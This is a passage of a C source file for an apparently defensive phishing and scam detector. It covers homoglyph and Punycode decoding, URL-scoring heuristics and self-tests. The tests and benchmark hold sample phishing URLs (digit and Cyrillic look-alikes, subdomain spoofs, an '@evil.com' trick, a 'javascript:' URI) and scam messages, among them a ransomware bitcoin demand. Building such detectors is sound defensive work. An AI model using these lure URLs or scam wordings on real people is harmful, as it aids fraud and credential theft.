    const unsigned char *p = (const unsigned char *)u->host;
    int has_non_ascii = 0;
    while (*p) {
        if (*p >= 0x80) { has_non_ascii = 1; break; }
        p++;
    }
    if (!has_non_ascii) return;

    /* Build an ASCII-only version by replacing non-ASCII bytes with
     * their plausible Latin equivalents. We walk the UTF-8 string and
     * collapse common Cyrillic/Greek confusables.                      */
    {
        char ascii[MAX_HOST];
        size_t k = 0;
        const unsigned char *q = (const unsigned char *)u->host;
        while (*q && k < MAX_HOST - 1) {
            uint32_t cp;
            int nbytes, b, valid = 1;
            if (*q < 0x80) {
                ascii[k++] = (char)*q;
                q++;
                continue;
            } else if (*q < 0xC0) {        /* stray continuation byte */
                ascii[k++] = '?';
                q++;
                continue;
            } else if (*q < 0xE0) {        /* 2-byte sequence */
                cp = (uint32_t)(*q & 0x1F); nbytes = 2;
            } else if (*q < 0xF0) {        /* 3-byte sequence */
                cp = (uint32_t)(*q & 0x0F); nbytes = 3;
            } else {                        /* 4-byte sequence */
                cp = (uint32_t)(*q & 0x07); nbytes = 4;
            }
            /* Decode continuation bytes into the full code point. Reusing
             * cp_fold() keeps the Cyrillic/Greek confusable table in one
             * place (shared with the Punycode/IDN detector below).        */
            for (b = 1; b < nbytes; b++) {
                if ((q[b] & 0xC0) != 0x80) { valid = 0; break; }
                cp = (cp << 6) | (uint32_t)(q[b] & 0x3F);
            }
            if (!valid) { ascii[k++] = '?'; q++; continue; }
            {
                char f = cp_fold(cp);
                ascii[k++] = f ? f : '?';
            }
            q += nbytes;
        }
        ascii[k] = '\0';

        /* Now check brand match in the ASCII-collapsed form */
        {
            int i;
            for (i = 0; BRANDS[i] != NULL; i++) {
                if (contains(ascii, BRANDS[i])) {
                    add_reason(v, 60,
                               "Mixed-script homoglyph: "
                               "'%s' resembles '%s'", u->host, BRANDS[i]);
                    return;
                }
            }
        }
        /* Even if no brand match, mixed-script in a domain is suspicious */
        add_reason(v, 25, "Mixed-script characters in domain (rare for Latin sites)");
    }
}

/* 9. IDN homograph detection via Punycode decoding (UTS-39 aligned).
 *
 * Cyrillic/Greek homograph attacks are usually delivered as Punycode
 * (`xn--`) labels, which are pure ASCII — so detect_mixed_script (which
 * only fires on raw UTF-8 bytes) never sees them. We decode each `xn--`
 * label per RFC 3492, then flag only the genuinely suspicious cases:
 *   - a label that MIXES Latin with Cyrillic/Greek/Armenian (classic
 *     homograph), or
 *   - a confusable-folded form that resembles a known brand.
 * A label that is purely one non-Latin script and matches no brand is
 * legitimate internationalisation (e.g. xn--wgv71a = 日本) and is left
 * alone — this is the UTS-39 distinction that avoids false positives on
 * real IDNs.                                                            */

/* RFC 3492 Punycode decode of one label (the part after "xn--").
 * Writes Unicode code points to out[]; returns count, or -1 on error.   */
static int
punycode_decode(const char *input, uint32_t *out, int out_cap) {
    const uint32_t base = 36, tmin = 1, tmax = 26, skew = 38, damp = 700;
    const uint32_t initial_bias = 72, initial_n = 0x80;
    uint32_t n = initial_n, bias = initial_bias, i = 0;
    int out_len = 0;
    size_t len = strlen(input);
    size_t in_pos = 0, last_delim = (size_t)-1, j;

    /* Basic (ASCII) code points precede the last hyphen delimiter. */
    for (j = 0; j < len; j++) if (input[j] == '-') last_delim = j;
    if (last_delim != (size_t)-1) {
        for (j = 0; j < last_delim; j++) {
            unsigned char c = (unsigned char)input[j];
            if (c >= 0x80) return -1;
            if (out_len >= out_cap) return -1;
            out[out_len++] = c;
        }
        in_pos = last_delim + 1;
    }

    while (in_pos < len) {
        uint32_t oldi = i, w = 1, k;
        for (k = base; ; k += base) {
            uint32_t digit, t;
            char c;
            if (in_pos >= len) return -1;
            c = input[in_pos++];
            if (c >= '0' && c <= '9') digit = (uint32_t)(c - '0') + 26;
            else if (c >= 'a' && c <= 'z') digit = (uint32_t)(c - 'a');
            else if (c >= 'A' && c <= 'Z') digit = (uint32_t)(c - 'A');
            else return -1;
            if (w != 0 && digit > (0xFFFFFFFFu - i) / w) return -1;  /* overflow */
            i += digit * w;
            t = (k <= bias) ? tmin : (k >= bias + tmax) ? tmax : (k - bias);
            if (digit < t) break;
            if (base - t != 0 && w > 0xFFFFFFFFu / (base - t)) return -1;
            w *= (base - t);
        }
        {
            uint32_t numpoints = (uint32_t)out_len + 1;
            uint32_t delta = (oldi == 0) ? (i - oldi) / damp : (i - oldi) / 2;
            delta += delta / numpoints;
            k = 0;
            while (delta > ((base - tmin) * tmax) / 2) {
                delta /= (base - tmin);
                k += base;
            }
            bias = k + ((base - tmin + 1) * delta) / (delta + skew);
            n += i / numpoints;
            i %= numpoints;
            if (n > 0x10FFFF) return -1;
            if (out_len >= out_cap) return -1;
            {   /* insert code point n at position i */
                int m;
                for (m = out_len; m > (int)i; m--) out[m] = out[m - 1];
                out[i] = n;
                out_len++;
            }
            i++;
        }
    }
    return out_len;
}

/* Script of a code point, restricted to what we need for homograph
 * analysis. Digits, hyphens and other scripts (CJK, Arabic, …) are
 * "neutral" and ignored by the mixing test.                            */
enum { SCR_NEUTRAL = 0, SCR_LATIN = 1, SCR_CONFUSABLE = 2 };
static int
cp_script(uint32_t cp) {
    if ((cp >= 'a' && cp <= 'z') || (cp >= 'A' && cp <= 'Z')) return SCR_LATIN;
    if (cp >= 0x00C0 && cp <= 0x024F) return SCR_LATIN;        /* Latin-1 + ext */
    if (cp >= 0x0400 && cp <= 0x04FF) return SCR_CONFUSABLE;   /* Cyrillic */
    if (cp >= 0x0370 && cp <= 0x03FF) return SCR_CONFUSABLE;   /* Greek */
    if (cp >= 0x0530 && cp <= 0x058F) return SCR_CONFUSABLE;   /* Armenian */
    return SCR_NEUTRAL;
}

/* Fold a code point to its ASCII confusable, or 0 if none. ASCII passes
 * through. Conservative, high-confidence mappings only.                 */
static char
cp_fold(uint32_t cp) {
    if (cp < 0x80) return (char)cp;
    switch (cp) {
        /* Cyrillic */
        case 0x0430: return 'a';  case 0x0435: return 'e';
        case 0x043E: return 'o';  case 0x0440: return 'p';
        case 0x0441: return 'c';  case 0x0443: return 'y';
        case 0x0445: return 'x';  case 0x0456: return 'i';
        case 0x0458: return 'j';  case 0x0455: return 's';
        case 0x04BB: return 'h';  case 0x04CF: return 'l';
        case 0x043A: return 'k';  case 0x0432: return 'v';
        case 0x043C: return 'm';  case 0x043D: return 'n';
        case 0x0442: return 't';  case 0x0431: return 'b';
        case 0x0433: return 'r';  case 0x0501: return 'd';
        /* Greek */
        case 0x03BF: return 'o';  case 0x03B1: return 'a';
        case 0x03C1: return 'p';  case 0x03B5: return 'e';
        case 0x03B9: return 'i';  case 0x03BD: return 'v';
        case 0x03BA: return 'k';  case 0x03C5: return 'u';
        case 0x0392: return 'b';  case 0x039F: return 'o';
        case 0x03C7: return 'x';  case 0x03C9: return 'w';
        /* Armenian */
        case 0x0561: return 'a';  case 0x0565: return 'e';
        case 0x0578: return 'o';  case 0x0570: return 'h';
        default: return 0;
    }
}

static void
detect_idn_homograph(const ParsedUrl *u, Verdict *v) {
    char host_copy[MAX_HOST];
    char folded[MAX_HOST];
    size_t fi = 0;
    int any_idn = 0, any_mixed = 0, saw_confusable = 0;
    char *label, *save;

    if (!strstr(u->host, "xn--")) return;

    strncpy(host_copy, u->host, sizeof(host_copy) - 1);
    host_copy[sizeof(host_copy) - 1] = '\0';

    label = strtok_r(host_copy, ".", &save);
    while (label) {
        if (strncmp(label, "xn--", 4) == 0) {
            uint32_t cps[MAX_HOST];
            int n = punycode_decode(label + 4, cps,
                                    (int)(sizeof(cps) / sizeof(cps[0])));
            if (n > 0) {
                int scripts = 0, t;
                any_idn = 1;
                for (t = 0; t < n; t++) {
                    int s = cp_script(cps[t]);
                    char f = cp_fold(cps[t]);
                    if (s == SCR_LATIN) scripts |= 1;
                    else if (s == SCR_CONFUSABLE) { scripts |= 2; saw_confusable = 1; }
                    if (fi < sizeof(folded) - 1) folded[fi++] = f ? f : '?';
                }
                if ((scripts & 1) && (scripts & 2)) any_mixed = 1;
            } else {
                size_t t2, L = strlen(label);
                for (t2 = 0; t2 < L && fi < sizeof(folded) - 1; t2++)
                    folded[fi++] = label[t2];
            }
        } else {
            size_t t2, L = strlen(label);
            for (t2 = 0; t2 < L && fi < sizeof(folded) - 1; t2++)
                folded[fi++] = label[t2];
        }
        if (fi < sizeof(folded) - 1) folded[fi++] = '.';
        label = strtok_r(NULL, ".", &save);
    }
    folded[fi] = '\0';
    if (!any_idn) return;

    /* A confusable-folded brand only appears via decoding (the raw host is
     * ASCII Punycode), so require that at least one non-Latin confusable
     * actually participated before declaring a brand homograph.          */
    if (saw_confusable) {
        int i;
        for (i = 0; BRANDS[i] != NULL; i++) {
            if (contains(folded, BRANDS[i])) {
                add_reason(v, 65,
                    "IDN homograph: Punycode '%s' decodes to resemble '%s'",
                    u->host, BRANDS[i]);
                return;
            }
        }
    }
    if (any_mixed) {
        add_reason(v, 50,
            "IDN homograph: Punycode label mixes Latin and non-Latin scripts ('%s')",
            u->host);
    }
    /* Pure single-script i18n with no brand resemblance: benign — no flag. */
}

/* ───────────────────────── public API ────────────────────────────────── */

/* check_url — returns a Verdict.
 *   verdict.score: 0..100
 *   0..14   : safe (no signal)
 *   15..39  : Log
 *   40..59  : Alert
 *   60..79  : Block
 *   80+     : Isolate
 */
static Verdict
check_url(const char *raw_url) {
    Verdict v;
    ParsedUrl u;

    memset(&v, 0, sizeof(v));

    if (!parse_url(raw_url, &u)) {
        if (raw_url && (strncmp(raw_url, "javascript:", 11) == 0
                     || strncmp(raw_url, "data:", 5) == 0)) {
            add_reason(&v, 90, "Dangerous URI scheme");
        }
        return v;
    }

    /* @ credential trick: "https://google.com@evil.com" — the part before
     * @ is userinfo (ignored by browsers); the real host is after @.
     * RFC 3986 §3.2.1 allows userinfo@host but browsers use host only. */
    {
        size_t scheme_len = u.is_https ? 8 : 7;  /* https:// or http:// */
        if (strchr(raw_url + scheme_len, '@')) {
            add_reason(&v, 45, "URL credential trick: @ in authority — "
                       "displayed host is fake, real host follows @");
        }
    }

    detect_homoglyph(&u, &v);
    detect_mixed_script(&u, &v);
    detect_idn_homograph(&u, &v);
    detect_typosquat(&u, &v);
    detect_suspicious_tld(&u, &v);
    detect_phishing_path(&u, &v);
    detect_subdomain_spoof(&u, &v);
    detect_subdomain_depth(&u, &v);
    detect_dga_entropy(&u, &v);
    detect_security_hyphenation(&u, &v);

    /* URL shorteners — hide the real destination, heavily abused in
     * phishing campaigns, smishing, and social-media scam links.
     * Score is low (+15, LOG) because shorteners also have legitimate uses;
     * the risk is compounded when combined with other signals.            */
    {
        static const char *URL_SHORTENERS[] = {
            "bit.ly", "tinyurl.com", "t.co", "goo.gl",
            "ow.ly", "buff.ly", "dlvr.it", "ift.tt",
            "shorte.st", "adf.ly", "bc.vc", "mcaf.ee",
            "rebrand.ly", "rb.gy", "cutt.ly", "shorturl.at",
            "tiny.cc", "is.gd", "v.gd", "clck.ru",
            NULL
        };
        int si;
        for (si = 0; URL_SHORTENERS[si]; si++) {
            if (strcmp(u.host, URL_SHORTENERS[si]) == 0 ||
                ends_with(u.host, URL_SHORTENERS[si])) {
                add_reason(&v, 15, "URL shortener '%s' — real destination hidden",
                           URL_SHORTENERS[si]);
                break;
            }
        }
    }

    /* Free hosting / page-builder platforms heavily abused for phishing.
     * A brand name in the SUBDOMAIN of these platforms is high-confidence
     * phishing (paypal-verify.netlify.app, google.pages.dev, etc.). The
     * legitimate brand owns their own TLD; they never use free builders.  */
    {
        /* SLD+TLD combinations that identify free-hosting platforms */
        static const char *FREE_HOSTS[] = {
            "netlify.app", "pages.dev", "github.io",
            "vercel.app", "glitch.me", "replit.dev", "repl.co",
            "web.app", "firebaseapp.com",
            "onrender.com", "railway.app",
            "surge.sh", "tiiny.site", "carrd.co",
            /* Cloud dev/app hosting used for phishing lures */
            "azurewebsites.net", "cloudapp.net", "azurecontainer.io",
            "blob.core.windows.net",
            "s3.amazonaws.com", "s3-website.amazonaws.com",
            "storage.googleapis.com",
            "cf-pages.com", "workers.dev",
            NULL
        };
        int fhi;
        for (fhi = 0; FREE_HOSTS[fhi]; fhi++) {
            if (ends_with(u.host, FREE_HOSTS[fhi])) {
                /* Check if any brand name appears before the platform suffix */
                size_t hlen = strlen(u.host);
                size_t plen = strlen(FREE_HOSTS[fhi]);
                /* There must be a subdomain before the platform suffix */
                if (hlen > plen + 1) {
                    char subdomain[MAX_HOST];
                    int bi;
                    size_t prefix_len = hlen - plen - 1; /* strip ".platform" */
                    if (prefix_len >= sizeof(subdomain)) prefix_len = sizeof(subdomain) - 1;
                    memcpy(subdomain, u.host, prefix_len);
                    subdomain[prefix_len] = '\0';
                    for (bi = 0; BRANDS[bi]; bi++) {
                        if (strstr(subdomain, BRANDS[bi])) {
                            add_reason(&v, 55,
                                "Free-hosting phishing: brand '%s' in subdomain "
                                "of '%s' — real brand never uses free page builders",
                                BRANDS[bi], FREE_HOSTS[fhi]);
                            break;
                        }
                    }
                }
                break;
            }
        }
    }

    /* IP-based URL with brand names in path → phishing.
     * Example: https://198.51.100.1/paypal/signin
     * Legitimate sites never use IP addresses as hosts.               */
    {
        int is_ip = 1;
        const char *h = u.host;
        /* Check if host contains only digits, dots, colons, hex-letters */
        while (*h) {
            if ((*h >= 'g' && *h <= 'z') || (*h >= 'G' && *h <= 'Z')) {
                is_ip = 0; break;
            }
            h++;
        }
        /* IPv6 literal: host starts with '[' */
        int is_ipv6 = (u.host[0] == '[');
        if ((is_ip && strchr(u.host, '.')) || is_ipv6) {
            /* Brand name in path of an IP URL is high-confidence phishing */
            int i;
            for (i = 0; BRANDS[i]; i++) {
                if (strstr(u.path, BRANDS[i])) {
                    add_reason(&v, 35,
                        "IP-based URL with brand '%s' in path — "
                        "legitimate sites don't use IP addresses",
                        BRANDS[i]);
                    break;
                }
            }
            /* Any phishing-typical path on an IP/IPv6 host is suspicious */
            if (strstr(u.path, "login") || strstr(u.path, "signin") ||
                strstr(u.path, "verify") || strstr(u.path, "account") ||
                strstr(u.path, "secure") || strstr(u.path, "update")) {
                add_reason(&v, 15,
                    "IP-address host with auth/security path — "
                    "legitimate services use domain names");
            }
        }
    }

    if (!u.is_https && v.score > 0) {
        add_reason(&v, 5, "Non-HTTPS connection");
    }

    return v;
}

/* ──────────────── unified scan API (Apple integration principle) ──────
 * Users should not need to decide whether their input is a URL or text.
 * hlse_scan accepts anything: if it looks like a URL, run URL detection;
 * otherwise run text detection. Returns the higher-scoring result.
 *
 * This is the recommended entry point for library consumers.           */

ScanResult
hlse_scan(const char *input) {
    ScanResult r;
    memset(&r, 0, sizeof(r));
    if (!input) return r;

    /* Detect URL by prefix */
    if (strncmp(input, "http://", 7) == 0 ||
        strncmp(input, "https://", 8) == 0 ||
        strncmp(input, "javascript:", 11) == 0 ||
        strncmp(input, "data:", 5) == 0)
    {
        Verdict uv = check_url(input);
        r.score = uv.score;
        r.is_url = 1;
        r.n_reasons = uv.n_reasons;
        /* Copy uv's reasons into r. Bound by the SOURCE array size
         * (uv.reasons has fewer slots than r.reasons); n_reasons is
         * already capped at that size by add_reason().                 */
        { int i; const int cap = (int)(sizeof(uv.reasons) / sizeof(uv.reasons[0]));
          for (i = 0; i < uv.n_reasons && i < cap; i++)
            memcpy(r.reasons[i], uv.reasons[i],
                   sizeof(uv.reasons[0]) < sizeof(r.reasons[0])
                   ? sizeof(uv.reasons[0]) : sizeof(r.reasons[0])); }

        /* Also check text content in the URL for compound signals —
         * a phishing link that says "urgent" in the path is worse.
         *
         * Skip the text scan for:
         *   1. government/military TLDs (.gov, .mil, .edu) — registry-
         *      restricted, so authority-impersonation hits are FPs.
         *   2. trusted hosts (TRUSTED_HOSTS list) — legitimate sites
         *      often have security keywords in their paths (e.g.
         *      account.live.com/password/reset) that would false-positive
         *      the text scanner.                                         */
        {
            int suppress_text = 0;
            {
                const char *after_scheme = input + (strncmp(input, "https://", 8) == 0 ? 8 : 7);
                const char *host_end = strstr(after_scheme, "/");
                size_t hlen_from_start = host_end
                    ? (size_t)(host_end - input) : strlen(input);
                char host_buf[256];
                size_t host_len = host_end
                    ? (size_t)(host_end - after_scheme) : strlen(after_scheme);
                if (host_len >= sizeof(host_buf)) host_len = sizeof(host_buf) - 1;
                memcpy(host_buf, after_scheme, host_len);
                host_buf[host_len] = '\0';

                if ((hlen_from_start > 4 && strncmp(input + hlen_from_start - 4, ".gov", 4) == 0) ||
                    (hlen_from_start > 4 && strncmp(input + hlen_from_start - 4, ".mil", 4) == 0) ||
                    (hlen_from_start > 4 && strncmp(input + hlen_from_start - 4, ".edu", 4) == 0))
                    suppress_text = 1;
                /* Suppress text scan on trusted hosts when URL check is clean */
                if (!suppress_text && r.score == 0 && is_trusted_host(host_buf))
                    suppress_text = 1;
            }
            TextVerdict tv = suppress_text ? (TextVerdict){0,0,{{0}}} : hlse_check_text(input);
            if (!suppress_text && tv.score > 0 && tv.n_reasons > 0) {
                int j;
                for (j = 0; j < tv.n_reasons && r.n_reasons < 16; j++) {
                    memcpy(r.reasons[r.n_reasons], tv.reasons[j],
                           sizeof(r.reasons[0]));
                    r.n_reasons++;
                }
                /* Take the higher score */
                if (tv.score > r.score) r.score = tv.score;
            }
            (void)suppress_text;
        }
    } else {
        TextVerdict tv = hlse_check_text(input);
        r.score = tv.score;
        r.is_url = 0;
        r.n_reasons = tv.n_reasons;
        { int i; for (i = 0; i < tv.n_reasons && i < 16; i++)
            memcpy(r.reasons[i], tv.reasons[i], sizeof(r.reasons[0])); }

        /* Scan for embedded URLs in text. If found, run URL analysis
         * and add to the score. This catches "click https://g00gle.com
         * now" where the text signals (urgency) compound with the URL
         * phishing signals (homoglyph).                               */
        {
            const char *p = input;
            while ((p = strstr(p, "http")) != NULL) {
                /* Validate it's actually a URL start */
                if (strncmp(p, "http://", 7) == 0 ||
                    strncmp(p, "https://", 8) == 0)
                {
                    /* Extract URL (until whitespace or end) */
                    char url_buf[2048];
                    int k = 0;
                    while (p[k] && p[k] != ' ' && p[k] != '\t' &&
                           p[k] != '\n' && p[k] != '\r' &&
                           k < (int)sizeof(url_buf) - 1)
                    {
                        url_buf[k] = p[k];
                        k++;
                    }
                    url_buf[k] = '\0';

                    if (k > 10) {  /* minimum viable URL length */
                        Verdict uv = check_url(url_buf);
                        if (uv.score > 0) {
                            int j;
                            for (j = 0; j < uv.n_reasons && r.n_reasons < 16; j++) {
                                memcpy(r.reasons[r.n_reasons], uv.reasons[j],
                                       sizeof(uv.reasons[0]) < sizeof(r.reasons[0])
                                       ? sizeof(uv.reasons[0]) : sizeof(r.reasons[0]));
                                r.n_reasons++;
                            }
                            r.score += uv.score;
                        }
                    }
                    p += k;
                } else {
                    p += 4;
                }
            }
        }
    }

    if (r.score > 100) r.score = 100;
    return r;
}

/* ──────────────────────── public API aliases ────────────────────────
 * These are the stable, documented names exposed via hlse_core.h.
 * The legacy names (check_url, action_for_score) are kept as static
 * helpers for the CLI driver.                                          */

Verdict
hlse_check_url(const char *raw_url) {
    return check_url(raw_url);
}

const char *
hlse_action_for_score(int score) {
    if (score >= 80) return "ISOLATE";
    if (score >= 60) return "BLOCK";
    if (score >= 40) return "ALERT";
    if (score >= 15) return "LOG";
    return "SAFE";
}

const char *
hlse_version(void) {
    return HLSE_VERSION;
}

/* ──────────────────────── output formatting ──────────────────────────── */

/* Used by print_verdict (CLI mode) and exposed for library users.
 * `__attribute__((unused))` silences the warning when only the URL
 * library is used and CLI helpers are excluded.                       */
#if defined(__GNUC__) || defined(__clang__)
__attribute__((unused))
#endif
static const char *
action_for_score(int score) {
    if (score >= 80) return "ISOLATE";
    if (score >= 60) return "BLOCK";
    if (score >= 40) return "ALERT";
    if (score >= 15) return "LOG";
    return "SAFE";
}

/* ──────────────────── CLI-only functions ─────────────────────────────
 * Everything from here to the end of the file is CLI-mode code.
 * Library users (HLSE_CORE_AS_LIB defined) get only check_url + types. */
#ifndef HLSE_CORE_AS_LIB

/* ─────────────────────────── self-tests ─────────────────────────────── */

static int
self_test(void) {
    int pass = 0, fail = 0;

    struct test_case {
        const char *url;
        int min_score;
        int max_score;
        const char *desc;
    };

    /* These cases are derived directly from the Rust v0.7 corpus. */
    struct test_case cases[] = {
        /* Homoglyph attacks */
        { "https://g00gle.com",                         40, 80,
          "Digit-substitution homoglyph" },
        { "https://paypa1.com",                         40, 80,
          "1-for-l homoglyph" },
        { "https://paypaII.com",                        40, 80,
          "Capital-I-for-l homoglyph" },
        /* Suspicious TLD */
        { "https://secure-net-fix.top/update",          25, 80,
          "Suspicious TLD + hyphenation" },
        /* Subdomain spoofing */
        { "https://paypal.com.attacker.xyz/verify",     50, 100,
          "Subdomain brand spoof" },
        { "https://apple.com.id-locked.top/unlock",     45, 100,
          "Subdomain spoof + suspicious TLD" },
        /* Phishing path */
        { "https://random.xyz/verify/account/signin",   30, 100,
          "Multiple phishing path patterns + sus TLD" },
        /* Dangerous URI */
        { "javascript:alert(1)",                        80, 100,
          "javascript: URI" },
        /* False positives — must NOT fire */
        { "https://github.com/anthropics/sdk",           0, 14,
          "Legit GitHub URL" },
        { "https://docs.google.com/document/d/1/edit",   0, 14,
          "Legit Google Docs" },
        { "https://en.wikipedia.org/wiki/Verify",        0, 14,
          "Wikipedia article happens to mention 'verify'" },
        { "https://mail.google.com/mail/u/0",            0, 14,
          "Legit Gmail subdomain" },
        { "https://www.paypal.com/signin",               0, 39,
          "Real PayPal — has 'signin' in path but legit" },
        { "https://paypal-verify.com/account",            40, 100,
          "Brand-hyphen phishing: paypal-verify" },
        { "https://apple-support.net/signin",             40, 100,
          "Brand-hyphen phishing: apple-support" },
        { "https://x7k2p9qzr4mw.com/login",               40, 100,
          "DGA: high-entropy random domain with digits" },
        /* IDN homograph via Punycode (xn--) — decode then confusable-fold */
        { "https://xn--pple-43d.com",                     60, 100,
          "IDN homograph: xn--pple-43d = аpple (Cyrillic a)" },
        { "https://xn--ggle-55da.com",                    60, 100,
          "IDN homograph: xn--ggle-55da = gооgle (Cyrillic o)" },
        { "https://xn--pypl-53dc.com",                    60, 100,
          "IDN homograph: xn--pypl-53dc = pаypаl (Cyrillic a)" },
        { "https://xn--mirosoft-gch.com",                 60, 100,
          "IDN homograph: xn--mirosoft-gch = miсrosoft (Cyrillic c)" },
        /* Brand-token FP guard — short brand "line" must not match "airline" */
        { "https://airline-update.com/flights",            0, 39,
          "FP guard: 'airline' must not match brand 'line'" },
        /* @ credential trick */
        { "https://google.com@evil.com/verify",           45, 100,
          "@ credential trick detected" },
        /* URL shorteners */
        { "https://bit.ly/3xYzAbc",                        15, 39,
          "URL shortener: bit.ly scores LOG (destination hidden)" },
        /* Free-hosting phishing */
        { "https://paypal-verify.netlify.app/login",       50, 100,
          "Free-hosting phishing: brand in netlify.app subdomain" },
        { "https://myapp.netlify.app/home",                 0, 25,
          "FP guard: legitimate app on netlify.app without brand" },
        /* Legitimate IDNs — must NOT be flagged as homographs (UTS-39) */
        { "https://xn--mnchen-3ya.com",                    0, 14,
          "Legit IDN: xn--mnchen-3ya = münchen (German, single-script)" },
        { "https://xn--wgv71a.com",                        0, 14,
          "Legit IDN: xn--wgv71a = 日本 (Japanese, single-script)" },
        { "https://xn--e1afmkfd.com",                      0, 14,
          "Legit IDN: xn--e1afmkfd = пример (pure Cyrillic, not a brand)" },
        /* New brands: security software, tax software */
        { "https://norton-verify.click/account",           60, 100,
          "New brand 'norton' + suspicious TLD + phishing path" },
        { "https://turbotax-update.xyz/signin",            60, 100,
          "New brand 'turbotax' + suspicious TLD + phishing path" },
        /* New path patterns: CMS admin */
        { "https://paypal.pages.dev/wp-admin",             80, 100,
          "Free-hosting + brand + /wp-admin path" },
        /* Raw (non-Punycode) UTF-8 homoglyphs — folded via cp_fold().
         * Greek omicron (U+03BF) was previously collapsed to '?' and
         * missed; now folds to 'o' and matches the brand.              */
        { "https://g\xce\xbf\xce\xbfgle.com",             40, 100,
          "Raw UTF-8 Greek-omicron homoglyph: gοοgle → google" },
        { "https://paypa\xd3\x8f.com/login",              40, 100,
          "Raw UTF-8 Cyrillic-palochka homoglyph: paypaӏ → paypal" },
        /* Armenian homoglyphs — cp_fold now covers U+0561/0565/0578/0570 */
        { "https://\xd5\xa1pple.com",                     60, 100,
          "Raw UTF-8 Armenian-Ayb homoglyph: \xd5\xa1pple → apple" },
        { "https://g\xd5\xb8\xd5\xb8gle.com",            60, 100,
          "Raw UTF-8 Armenian-Vo homoglyph: g\xd5\xb8\xd5\xb8gle → google" },
        /* Cyrillic Komi De (U+0501) → 'd' */
        { "https://\xd4\x81iscord.com",                   60, 100,
          "Raw UTF-8 Cyrillic-Komi-De homoglyph: \xd4\x81iscord → discord" },
        /* Greek chi/omega (U+03C7/03C9) — newly mapped */
        { "https://\xcf\x89hatsapp.com",                  60, 100,
          "Raw UTF-8 Greek-omega homoglyph: \xcf\x89hatsapp → whatsapp" },
        /* Subdomain spoofing + phishing-typical SLD (security word + hyphen) */
        { "https://apple.com.id-login.net/appleid",        60, 100,
          "Subdomain spoof + phishing SLD (login) = BLOCK" },
        /* brand-hyphen alone on .net (no suspicious TLD, no path) — still ALERT */
        { "https://paypal-verify.net",                     20, 59,
          "FP calibration: brand-hyphen alone without sus TLD/path stays below BLOCK" },
    };
    int n = sizeof(cases) / sizeof(cases[0]);
    int i;

    printf("Running %d test cases...\n\n", n);

    for (i = 0; i < n; i++) {
        Verdict v = check_url(cases[i].url);
        int ok = (v.score >= cases[i].min_score
                  && v.score <= cases[i].max_score);
        printf("%s [%3d in %d..%d]  %-50s  %s\n",
               ok ? "PASS" : "FAIL",
               v.score, cases[i].min_score, cases[i].max_score,
               cases[i].url, cases[i].desc);
        if (!ok) {
            int j;
            for (j = 0; j < v.n_reasons; j++) {
                printf("       reason: %s\n", v.reasons[j]);
            }
            fail++;
        } else {
            pass++;
        }
    }

    printf("\n%d passed, %d failed\n", pass, fail);
    return fail == 0 ? 0 : 1;
}

/* ──────────────────────── corpus benchmark ──────────────────────────── */

static int
benchmark(void) {
    static const char *malicious[] = {
        "https://g00gle.com/accounts/signin",
        "https://g00gle-security.top/verify",
        "https://paypa1.com/signin",
        "https://paypaII.com/signin",
        "https://gogle.com/signin",
        "https://amzaon.com/account",
        "https://mіcrosoft.com/signin",        /* Cyrillic */
        "https://paypal.com.secure-update-verify.xyz/signin",
        "https://netflix.com.billing-update.online/login",
        "https://apple.com.id-locked-verify.top/unlock",
        "https://amazon.com.account-security-alert.xyz/verify",
        "https://random-domain-98127.xyz/account/verify/urgent",
        "https://secureaccount.top/paypal/signin/verify-identity",
        "https://webmail-reset.click/office365/login",
        "https://document-secure-view.xyz/docusign/verify",
        /* Japanese phishing */
        "https://rakuten.co.jp.security-alert.xyz/login",
        "https://amazon.co.jp.account-verify.top/signin",
        "https://my.softbank.jp.account-suspended.online/reactivate",
        NULL
    };
    static const char *legit[] = {
        "https://github.com",
        "https://github.com/anthropics/sdk",
        "https://google.com",
        "https://mail.google.com/mail/u/0",
        "https://docs.google.com/document/d/1/edit",
        "https://microsoft.com",
        "https://learn.microsoft.com/en-us/azure",
        "https://apple.com",
        "https://docs.rs/tokio",
        "https://crates.io/crates/serde",
        "https://stackoverflow.com/questions/49937",
        "https://en.wikipedia.org/wiki/Rust_(programming_language)",
        "https://en.wikipedia.org/wiki/Verify",
        "https://www.paypal.com/signin",
        "https://www.chase.com/personal/credit-cards",
        /* Japanese legitimate */
        "https://www.rakuten.co.jp",
        "https://www.amazon.co.jp",
        "https://www.nhk.or.jp/news",
        NULL
    };

    int n_mal = 0, n_legit = 0;
    int detected = 0, fp = 0;
    int i;

    for (i = 0; malicious[i]; i++) {
        Verdict v = check_url(malicious[i]);
        n_mal++;
        if (v.score >= 40) detected++;
        else printf("MISSED %s [%d]\n", malicious[i], v.score);
    }
    for (i = 0; legit[i]; i++) {
        Verdict v = check_url(legit[i]);
        n_legit++;
        if (v.score >= 40) {
            fp++;
            printf("FALSE POSITIVE %s [%d]\n", legit[i], v.score);
        }
    }

    {
        double tp_rate = (double)detected / n_mal;
        double fp_rate = (double)fp / n_legit;
        double precision = (detected + fp) > 0
            ? (double)detected / (detected + fp) : 1.0;
        double recall = tp_rate;
        double f1 = (precision + recall) > 0
            ? 2 * precision * recall / (precision + recall) : 0;

        printf("\n=== Corpus Benchmark ===\n");
        printf("Malicious: %d/%d detected  (%.1f%% recall)\n",
               detected, n_mal, tp_rate * 100);
        printf("Legitimate: %d/%d false positives (%.1f%% FP rate)\n",
               fp, n_legit, fp_rate * 100);
        printf("Precision: %.3f\n", precision);
        printf("Recall:    %.3f\n", recall);
        printf("F1:        %.3f\n", f1);
        printf("\nAcceptance criteria:\n");
        printf("  recall >= 0.85    %s\n", recall >= 0.85 ? "PASS" : "FAIL");
        printf("  fp_rate <= 0.05   %s\n", fp_rate <= 0.05 ? "PASS" : "FAIL");
        printf("  F1 >= 0.85        %s\n", f1 >= 0.85 ? "PASS" : "FAIL");

        return (recall >= 0.85 && fp_rate <= 0.05 && f1 >= 0.85) ? 0 : 1;
    }
}

/* ─────────────────────────── text scam tests ────────────────────────── */

#include "hlse_text.h"

static int
text_self_test(void) {
    int pass = 0, fail = 0;
    int i;

    struct text_case {
        const char *input;
        int min_score;
        int max_score;
        const char *desc;
    };
    struct text_case cases[] = {
        /* MUST FIRE */
        { "URGENT: Buy $200 iTunes gift cards immediately to unlock your account",
          50, 100, "Tech-support scam" },
        { "This is urgent. Please wire $50,000 to this account immediately",
          40, 100, "BEC wire fraud" },
        { "Congratulations! You have won $10,000. Claim your prize now",
          30, 100, "Lottery scam" },
        { "Don't tell anyone, but send me the gift card code now",
          40, 100, "Grooming + bait" },
        { "Your files have been encrypted. Send 1 BTC to bc1q9h6tq358tcssvfjafy2dajfu7lk6f35c9cn3t2",
          50, 100, "Ransomware demand" },
